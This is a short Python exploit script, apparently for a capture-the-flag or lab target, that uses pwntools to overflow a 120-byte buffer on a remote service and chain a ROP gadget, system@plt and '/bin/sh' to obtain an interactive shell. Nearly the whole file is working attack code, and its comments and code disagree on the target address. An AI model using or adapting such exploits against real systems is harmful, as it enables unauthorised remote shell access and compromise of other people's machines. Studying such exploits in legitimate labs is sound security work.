#!/usr/bin/env python3

from pwn import *

# rop address 0x401206 
# 0x00401206 : pop r13; pop r14; pop r15; ret
# buffer length 120
# 40116e <system@plt>
# target function at 0x401152 from objdump or gdb
# attack = buffer, rop, system address into r13, junk into r14, junk into r14, function call, then /bin/sh.


victim = remote("10.10.10.147",1337)
buffer = "A" * 120
pop = p64(0x401206)
system = p64(0x40116e)
target = p64(0x401156)
shell = "/bin/sh\x00"

attack = buffer + pop + system + "DEADCODE" + "JUNKCODE" + target + shell

victim.sendline(attack)
victim.interactive()
